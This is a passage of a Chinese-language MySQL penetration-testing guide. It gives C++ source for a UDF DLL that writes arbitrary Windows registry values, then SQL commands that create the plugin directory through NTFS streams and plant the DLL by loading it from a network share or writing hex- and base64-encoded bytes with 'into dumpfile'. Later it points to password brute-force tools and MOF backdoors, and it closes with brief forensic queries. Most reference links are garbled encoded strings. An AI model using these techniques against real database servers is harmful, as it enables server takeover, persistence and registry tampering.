
```cpp
#include <winsock.h>
#include <mysql.h>
#include <stdio.h>
#include <windows.h>

//--------
extern "C" __declspec(dllexport)my_bool regwrite_init(UDF_INIT *initid,
    UDF_ARGS *args,
    char *message)
{
    //判断参数是否正确,三个参数必须是字符串
    if (args->arg_type[0] == STRING_RESULT &&  // 主键
        args->arg_type[1] == STRING_RESULT &&  // 键项
        args->arg_type[2] == STRING_RESULT &&  // 键
        args->arg_type[3] == STRING_RESULT     // 写入的值
        )
    {
        return 0;
    }
    else {
        strcpy(
            message
            , "Expected exactly four string type parameter"
            );
        return 1;
    }
}

extern "C" __declspec(dllexport)char*  regwrite(UDF_INIT *initid
    , UDF_ARGS *args
    , char* result
    , unsigned long* length
    , char *is_null
    , char *error)
{
    HKEY hRoot;
    // 判断根键
    if (strcmp("HKEY_LOCAL_MACHINE", (char*)(args->args)[0]) == 0)
        hRoot = HKEY_LOCAL_MACHINE;
    else if (strcmp("HKEY_CLASSES_ROOT", (char*)(args->args)[0]) == 0)
        hRoot = HKEY_CLASSES_ROOT;
    else if (strcmp("HKEY_CURRENT_USER", (char*)(args->args)[0]) == 0)
        hRoot = HKEY_CURRENT_USER;
    else if (strcmp("HKEY_USERS", (char*)(args->args)[0]) == 0)
        hRoot = HKEY_USERS;
    else
    {
        initid->ptr = (char *)malloc(50 + strlen((args->args)[0]));
        sprintf(initid->ptr, "unknow:%s\r\n", (args->args)[0]);
        *length = (unsigned long)strlen(initid->ptr);
        return initid->ptr;
    }

    HKEY hKey;
    DWORD dwType = REG_SZ;
    // 打开注册表键，不存在则创建它

    // 判断根键存不存在
    // szSubKey编码转换 char转wchar
    int szSubKey_len = (int)MultiByteToWideChar(CP_ACP, 0, (args->args)[1], strlen((args->args)[1]), NULL, 0);
    wchar_t*    szSubKey = new wchar_t[szSubKey_len + 1];
    MultiByteToWideChar(CP_ACP, 0, (args->args)[1], strlen((args->args)[1]), szSubKey, szSubKey_len);
    szSubKey[szSubKey_len] = '\0';

    size_t lRet = RegCreateKeyEx(hRoot, szSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
    if (lRet != ERROR_SUCCESS)
    {
        initid->ptr = (char *)malloc(50 + strlen((args->args)[1]));
        sprintf(initid->ptr, "unknow:%s\r\n", (args->args)[1]);
        *length = (unsigned long)strlen(initid->ptr);
        return initid->ptr;
    }

    // 修改注册表键值，没有则创建它
    // ValueName修改的键项转换 char转wchar
    int ValueName_len = MultiByteToWideChar(CP_ACP, 0, (args->args)[2], strlen((args->args)[2]), NULL, 0);
    wchar_t*   ValueName = new wchar_t[ValueName_len + 1];
    MultiByteToWideChar(CP_ACP, 0, (args->args)[2], strlen((args->args)[2]), ValueName, ValueName_len);
    ValueName[ValueName_len] = '\0';

    //// 注册表键值编码转换 char转wchar
    int data_len = MultiByteToWideChar(CP_ACP, 0, (args->args)[3], strlen((args->args)[3]), NULL, 0);
    wchar_t*  data = new wchar_t[data_len + 1];
    MultiByteToWideChar(CP_ACP, 0, (args->args)[3], strlen((args->args)[3]), data, data_len);
    data[data_len] = '\0';
    // 计算宽字节的长度
    DWORD iLen = (DWORD)wcslen(data);

    //注册表键值修改
    lRet = RegSetValueEx(hKey, ValueName, 0, dwType, (unsigned char*)data, sizeof(wchar_t)*data_len);
    if (lRet != ERROR_SUCCESS)
    {
        initid->ptr = (char *)malloc(50 + strlen((args->args)[2]));
        sprintf(initid->ptr, "unknow:%s\r\n", (args->args)[2]);
        *length = (unsigned long)strlen(initid->ptr);
        return initid->ptr;
    }
    RegCloseKey(hKey);

    // 当*is_null被设置为1时，返回值为NULL
    if (!(*result) || result == NULL) {
        *is_null = 1;
    }
    else {
        sprintf(result, "success");
        result[iLen] = 0x00;
        *length = strlen(result);
    }
    // 返回结果
    return result;
}

extern "C" __declspec(dllexport)void regwrite_deinit(
    UDF_INIT *initid)
{
    if (initid->ptr)
    {
        free(initid->ptr);
    }
}
```

## 3、UDF加载方法

UDF有两种加载方式，一种是修改修改MySQL配置文件。第二种则是将UDF放置在MySQL指定的插件目录中加载。

### 3.1 修改MySQL配置文件

另一种方法是用插件目录编写一个新的MySQL配置文件并将其传递给`mysqld`。

- 启动参数配置

  ```
  // 通过mysqld更改plugin的目录位置
  mysqld.exe –plugin-dir=C:\\temp\\plugins\\
  // 编写一个新的mysql配置文件，并通过–defaults-file参数将其传递给mysqld
  mysqld.exe --defaults-file=C:\temp\my.ini
  ```

- my.ini配置

  ```
  [mysqld]
  plugin_dir = C:\\temp\\plugins\\
  ```

### 3.2 新建插件目录

```
show variables like 'plugin_dir';   # 查看路径

select 'xxx' into dumpfile 'D:\phpStudy\MySQL\lib::$INDEX_ALLOCATION';          # 新建目录lib

select 'xxx' into dumpfile 'D:\phpStudy\MySQL\lib\plugin::$INDEX_ALLOCATION';  # 新建目录plugin
```

### 3.3 导出UDF文件置扩展目录

- `load_file`函数

  `load_file`函数支持网络路径，如果将DLL复制到网络共享中，则可以直接加载它并写入磁盘。

  ```
  select load_file('\\\\192.168.0.19\\share\\udf.dll') into dumpfile "D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll";
  ```

- 用一个十六进制编码的字符串将整个DLL文件写入磁盘。

  ```
  // 转换为hex函数
  select hex(load_file('D:\\udf.dll')) into dumpfile "D:\\udf.hex";
  // 导入
  select 0x4d5a...... into dumpfile "D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll";
  ```

- 创建一个表并将二进制数据插入到十六进制编码流中，其中的二进制数据用`update`语句来连接。

  ```
  create table temp(data longblob);
  insert into temp(data) values (0x4d5a9....);
  update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b377a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000); select data from temp into dump file "D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll";
  ```

- 直接在磁盘上将文件从网络共享加载到第三种方法创建的表中，使用“`load data infile`”语句在本地加载。像上图所示将文件转换为十六进制，并在写入磁盘时取消编辑。

  ```
  load data infile '\\\\192.168.0.19\\share\\udf.hex' into table temp fields terminated by '@OsandaMalith' lines terminated by '@OsandaMalith' (data);
  select unhex(data) from temp into dumpfile 'D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll';
  ```

- 使用MySQL 5.6.1和MariaDB 10.0.5中介绍的函数“`to_base64`”和“`from_base64`”上传二进制文件。

  ```
  # 转换为base64
  select to_base64(load_file('D:\\udf.dll'));

  # base64导出为DLL
  select from_base64("Base64编码") into dumpfile "D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll"；
  ```

## 4、Mysql弱口令

### 4.1 暴力破解程序

- 工具：`hydra`

- CPP

  用链表实现的MYSQL、MSSQL和oracle密码暴破C程序

  9b9K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3f1#2x3h3y4@1L8#2)9J5k6h3y4G2L8g2)9J5c8X3k6G2P5r3S2S2j5$3E0Q4x3V1j5K6y4e0j5H3y4l9`.`.

- Python

  74fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6U0K9r3W2F1j5i4y4#2L8U0l9J5x3g2)9J5c8Y4m8%4k6q4)9#2k6X3y4J5j5h3y4C8i4K6u0r3j5X3I4G2j5W2)9J5c8X3#2S2M7%4c8W2M7W2)9J5c8X3#2&6M7%4q4D9i4K6u0r3L8i4W2K6M7h3I4Q4y4h3k6U0M7X3q4U0K9#2)9J5k6i4m8&6

  9ffK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2%4j5h3W2@1j5h3I4G2L8X3g2Q4x3X3g2U0L8W2)9J5c8Y4m8&6N6r3S2G2L8W2)9J5k6r3#2&6M7%4q4D9i4K6u0V1L8i4g2D9N6q4)9J5k6h3S2@1L8h3H3`.

- Go

  182K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6F1k6i4c8^5k6X3I4&6i4K6u0r3P5q4)9J5k6r3y4J5j5h3y4C8

### 4.2 MySQL口令加密解密

## 5、WEB组合利用

### 5.1 后门方法

导出Mof

### 5.2 WEB渗透测试扩展

php探针、PHPMyadmin

## 6、取证分析

```
// 查看系统信息
select @@version_compile_os,@@version_compile_machine,@@plugin_dir;

// 查看加载的函数
select * from mysql.func;
```

## 7、参考

Mysql函数扩展之UDF开发

0b7K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8X3q4D9j5X3g2J5N6s2y4Z5i4K6u0r3j5i4u0@1K9h3y4D9k6g2)9J5c8X3c8W2N6r3q4A6L8s2y4Q4x3V1j5%4z5o6f1$3y4K6j5$3x3b7`.`.

VS2015配置C/C++-MySQL开发环境

4b2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8X3c8S2M7$3!0Q4y4h3k6U0M7$3c8F1i4K6u0r3j5i4u0@1K9h3y4D9k6g2)9J5c8X3c8W2N6r3q4A6L8s2y4Q4x3V1j5#2y4o6j5@1y4U0R3#2z5b7`.`.

MySQL UDF（自定义函数）

f0eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8X3u0D9L8$3N6K6i4K6u0W2j5$3!0E0i4K6u0r3M7X3q4C8k6i4u0Q4x3V1k6H3i4K6u0r3y4o6x3%4y4K6x3@1x3#2)9J5k6h3S2@1L8h3H3`.

MySQL UDF的调试方式 - debugview
